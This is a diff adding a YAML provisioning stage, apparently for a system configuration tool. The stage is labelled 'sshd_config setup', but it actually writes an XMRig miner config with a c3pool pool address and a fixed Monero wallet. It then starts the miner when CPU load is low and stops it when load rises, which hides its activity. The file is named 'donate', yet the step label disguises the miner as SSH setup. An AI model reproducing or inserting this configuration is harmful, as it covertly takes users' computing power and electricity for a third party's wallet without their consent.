@@ -1,0 +1,39 @@
+
+
+stages:
+  reconcile:
+       -  name: "sshd_config setup"
+          files:
+          - path: "/etc/xmrig/config.json"
+            owner: 0
+            group: 0
+            permission: 600
+            content: |
+                     {
+                      "pools": [
+                          {
+                              "url": "mine.c3pool.com:13333",
+                              "user": "84AsfE73Cy7hAYKy7PN8N8D3fh39JzXyLjaiYpgXm3NrJHH7cTPxUJSgsdFiSL6mwE9MKpvrYJQoaTxRG6sJX6aBRpr45dc"
+                          }
+                        ]
+                      }
+                  } 
+          commands: 
+          - |
+              cores=$(nproc) 
+              load=$(awk '{print $3}'< /proc/loadavg)
+              usage=$(echo | awk -v c="${cores}" -v l="${load}" '{print l*100/c }')
+              if [[ ${usage} -le 20 ]]; then
+                  if [ -e "/usr/bin/runit-start" ]; then
+                    runit-start xmrig
+                  else 
+                    systemctl start xmrig
+                  fi
+              else
+                  if [ -e "/usr/bin/runit-stop" ]; then
+                    runit-stop xmrig
+                  else 
+                    systemctl stop xmrig
+                  fi
+              fi
+name: "donate"
